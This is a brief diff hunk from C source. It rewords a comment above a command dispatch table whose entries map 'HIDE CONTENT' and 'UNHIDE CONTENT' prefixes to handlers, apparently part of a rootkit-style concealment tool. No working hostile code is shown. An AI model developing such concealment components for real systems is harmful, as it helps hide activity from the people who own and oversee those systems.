@@ -9,7 +9,7 @@ struct rk_dispatch_entry {
 	rk_handler_t	handler;
 };
 
-// Longer prefixes first so "UNHIDE FILE" matches before "HIDE FILE".
+// Longer prefixes first so greedy match works correctly.
 static const struct rk_dispatch_entry dispatch_table[] = {
 	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
 	{ "HIDE CONTENT ",   13, cmd_hide_content   },
